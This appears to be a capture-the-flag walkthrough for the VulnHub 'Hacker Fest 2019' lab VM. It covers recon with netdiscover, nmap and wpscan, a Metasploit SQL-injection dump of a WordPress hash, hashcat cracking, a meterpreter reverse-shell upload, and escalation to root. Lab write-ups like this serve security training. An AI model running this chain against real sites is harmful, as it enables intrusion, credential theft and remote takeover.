
# HackFest 2019 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/hacker-fest-2019,378/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.159   08:00:27:13:d1:bb      1      xx  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 192.168.1.159
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 14:00 EDT
Nmap scan report for 192.168.1.159
Host is up (0.00053s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           420 Nov 30  2017 index.php
| -rw-rw-r--    1 ftp      ftp         19935 Sep 05  2019 license.txt
| -rw-rw-r--    1 ftp      ftp          7447 Sep 05  2019 readme.html
| -rw-rw-r--    1 ftp      ftp          6919 Jan 12  2019 wp-activate.php
| drwxrwxr-x    9 ftp      ftp          4096 Sep 05  2019 wp-admin
| -rw-rw-r--    1 ftp      ftp           369 Nov 30  2017 wp-blog-header.php
| -rw-rw-r--    1 ftp      ftp          2283 Jan 21  2019 wp-comments-post.php
| -rw-rw-r--    1 ftp      ftp          3255 Sep 27  2019 wp-config.php
| drwxrwxr-x    8 ftp      ftp          4096 Sep 29  2019 wp-content
| -rw-rw-r--    1 ftp      ftp          3847 Jan 09  2019 wp-cron.php
| drwxrwxr-x   20 ftp      ftp         12288 Sep 05  2019 wp-includes
| -rw-rw-r--    1 ftp      ftp          2502 Jan 16  2019 wp-links-opml.php
| -rw-rw-r--    1 ftp      ftp          3306 Nov 30  2017 wp-load.php
| -rw-rw-r--    1 ftp      ftp         39551 Jun 10  2019 wp-login.php
| -rw-rw-r--    1 ftp      ftp          8403 Nov 30  2017 wp-mail.php
| -rw-rw-r--    1 ftp      ftp         18962 Mar 28  2019 wp-settings.php
| -rw-rw-r--    1 ftp      ftp         31085 Jan 16  2019 wp-signup.php
| -rw-rw-r--    1 ftp      ftp          4764 Nov 30  2017 wp-trackback.php
|_-rw-rw-r--    1 ftp      ftp          3068 Aug 17  2018 xmlrpc.php
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.1.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh      OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 b7:2e:8f:cb:12:e4:e8:cd:93:1e:73:0f:51:ce:48:6c (RSA)
|   256 70:f4:44:eb:a8:55:54:38:2d:6d:75:89:bb:ec:7e:e7 (ECDSA)
|_  256 7c:0e:ab:fe:53:7e:87:22:f8:5a:df:c9:da:7f:90:79 (ED25519)
80/tcp    open  http     Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 5.2.3
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Tata intranet &#8211; Just another WordPress site
10000/tcp open  ssl/http MiniServ 1.890 (Webmin httpd)
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Login to Webmin
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Linux-Debian
| Not valid before: 2019-09-09T13:32:42
|_Not valid after:  2024-09-07T13:32:42
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.60 seconds
```

## WordPress Scanner

```
$ wpscan --url http://192.168.1.159
```

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.2
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.159/ [192.168.1.159]
[+] Started: Sat Oct 10 14:31:10 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.159/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.1.159/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.159/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.159/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.1.159/?feed=rss2, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://192.168.1.159/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://192.168.1.159/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://192.168.1.159/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://192.168.1.159/wp-content/themes/twentyseventeen/style.css?ver=5.2.3
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.159/wp-content/themes/twentyseventeen/style.css?ver=5.2.3, Match: 'Version: 2.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-google-maps
 | Location: http://192.168.1.159/wp-content/plugins/wp-google-maps/
 | Last Updated: 2020-08-25T10:38:00.000Z
 | [!] The version is out of date, the latest version is 8.0.26
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.10.02 (50% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.1.159/wp-content/plugins/wp-google-maps/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Oct 10 14:31:14 2020
[+] Requests Done: 23
[+] Cached Requests: 35
[+] Data Sent: 5.229 KB
[+] Data Received: 3.913 KB
[+] Memory used: 211.086 MB
[+] Elapsed time: 00:00:04
```

## WordPress Google Maps SQLi Exploit

```
$ msfconsole
msf5 > search google_maps

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/admin/http/wp_google_maps_sqli  2019-04-02       normal  Yes    WordPress Google Maps Plugin SQL Injection
```

```
msf5 > use auxiliary/admin/http/wp google_maps_sqli
msf5 auxiliary(admin/http/wp_google_maps_sqli) > set RHOSTS 192.168.1.159

msf5 auxiliary(admin/http/wp_google_maps_sqli) > show options
Module options (auxiliary/admin/http/wp_google_maps_sqli):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DB_PREFIX  wp_              yes       WordPress table prefix
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.159    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host
```

```
msf5 auxiliary(admin/http/wp_google_maps_sqli) > exploit
[*] Running module against 192.168.1.159
[*] 192.168.1.159:80 - Trying to retrieve the wp_users table...
[+] Credentials saved in: /home/kali/.msf4/loot/20201010143543_default_192.168.1.159_wp_google_maps.j_294862.bin
[+] 192.168.1.159:80 - Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local
[*] Auxiliary module execution completed
```

Credentials: **webmaster** : **$P$Bsq0diLTcye6ASlofreys4GzRlRvSrl**

## Credentials Cracking

```
$ cat credentials.txt
$P$Bsq0diLTcye6ASlofreys4GzRlRvSrl

$ hashcat -m 400 ~/Desktop/credentials.txt /usr/share/wordlists/rockyou.txt

$P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1:kittykat1

Session..........: hashcat
Status...........: Cracked
Hash.Name........: phpass
Hash.Target......: $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1
Time.Started.....: Sat Oct 10 15:14:41 2020 (1 sec)
Time.Estimated...: Sat Oct 10 15:14:42 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/my.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        1 H/s (0.16ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7168-8192
Candidates.#1....: kittykat1 -> kittykat1

Started: Sat Oct 10 15:14:09 2020
Stopped: Sat Oct 10 15:14:43 2020
```

## WordPress Admin Shell Upload Exploit

```
msf5 > use exploit/unix/webapp/wp_admin_shell_upload
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 192.168.0.20
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username webmaster
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password kittykat1
```

```
msf5 exploit(unix/webapp/wp_admin_shell_upload) > show options
Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   kittykat1        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.159    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   webmaster        yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.102    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```

```
msf5 exploit(unix/webapp/wp_admin_shell_upload) > exploit
[*] Started reverse TCP handler on 192.168.1.102:4444
[*] Authenticating with WordPress using webmaster:kittykat1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/JhqwQbCIWf/ckblNndVRK.php...
[*] Sending stage (38288 bytes) to 192.168.1.159
[*] Meterpreter session 1 opened (192.168.1.102:4444 -> 192.168.1.159:42166) at 2020-10-10 15:19:22 -0400
[+] Deleted ckblNndVRK.php
[+] Deleted JhqwQbCIWf.php
[+] Deleted ../JhqwQbCIWf

meterpreter > sysinfo
Computer    : HF2019-Linux
OS          : Linux HF2019-Linux 4.19.0-0.bpo.6-amd64 #1 SMP Debian 4.19.67-2~bpo9+1 (2019-09-10) x86_64
Meterpreter : php/linux
```

## Privilege Escalation

```
meterpreter > shell
python -c 'import pty;pty.spawn("/bin/bash")'

www-data@HF2019-Linux:/home/webmaster$ su webmaster
Password: kittykat1

webmaster@HF2019-Linux:~$ sudo su
root@HF2019-Linux:/home/webmaster#
```

## Flag Acquiring

```
root@HF2019-Linux:/home/webmaster# cat /home/webmaster/flag.txt
83cad236438ff0c0dbce55d7f0034aee18f5c39e

root@HF2019-Linux:/home/webmaster# cat /root/flag.txt
3dcdf93d2976321d7a8c47a6bb2d48837d330624
```

